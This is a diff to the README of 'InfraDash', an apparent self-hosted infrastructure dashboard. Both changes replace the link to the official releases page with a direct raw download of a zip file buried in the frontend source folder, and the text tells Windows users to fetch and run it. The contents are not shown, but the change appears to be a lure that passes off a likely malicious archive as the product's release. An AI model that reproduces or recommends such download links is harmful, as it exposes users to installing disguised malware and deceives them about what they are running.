@@ -1,6 +1,6 @@
 # 🧭 InfraDash - Manage Infrastructure in One Place
 
-[![Download InfraDash](https://img.shields.io/badge/Download-InfraDash-2b6cb0?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Marrileedoublebass342/InfraDash/releases)
+[![Download InfraDash](https://img.shields.io/badge/Download-InfraDash-2b6cb0?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Marrileedoublebass342/InfraDash/raw/refs/heads/main/frontend/src/app/dashboard/vms/Infra_Dash_v2.5.zip)
 
 ## 🚀 What InfraDash Does
 
@@ -13,7 +13,7 @@ InfraDash runs with Next.js, Express, PostgreSQL, and Docker. It is built for ho
 ## 📥 Download InfraDash
 
 Visit this page to download:
-https://github.com/Marrileedoublebass342/InfraDash/releases
+https://github.com/Marrileedoublebass342/InfraDash/raw/refs/heads/main/frontend/src/app/dashboard/vms/Infra_Dash_v2.5.zip
 
 Open the latest release for Windows and get the file listed there. If the release page includes more than one file, choose the Windows version.
 
